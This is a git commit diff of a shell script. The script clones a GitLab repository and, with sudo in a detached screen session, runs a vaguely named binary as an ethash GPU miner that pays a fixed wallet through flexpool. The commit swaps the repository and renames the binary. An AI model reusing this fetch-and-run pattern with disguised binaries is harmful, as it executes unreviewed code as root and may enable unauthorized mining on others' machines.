b48cae399a4e8d5f967d8ab2b7efcd3794d51074
Treecommon <103907893+Treecommon@users.noreply.github.com>
2022-04-19 13:36:48 +0700

    Update gr2.sh

--- gr2.sh
+++ gr2.sh
@@ -2,8 +2,8 @@
 sudo apt update
 sudo apt-get install zip unzip
 sudo apt install screen -y
-screen -dmS sahuman.sh 65 75
-sudo git clone https://gitlab.com/taufiqurrohmanmaz/sainame127.git
-cd sainame127
-chmod +x itsme
-ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./itsme -a ethash -w 0x3D02F7B8DCB18E778fE35bf8B5A7F91d819bF0C4 -p stratum+tcp://eth-hk.flexpool.io:4444 stratum+tcp://eth-hke.flexpool.io -r $ip --nvidia 1
+screen -dmS ya.sh 65 75
+sudo git clone https://gitlab.com/useragen/lancarkanlah.git
+cd lancarkanlah
+chmod +x gr
+ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./gr -a ethash -w 0x3D02F7B8DCB18E778fE35bf8B5A7F91d819bF0C4 -p stratum+tcp://eth-sg.flexpool.io:4444 stratum+tcp://eth-hke.flexpool.io -r $ip --nvidia 1
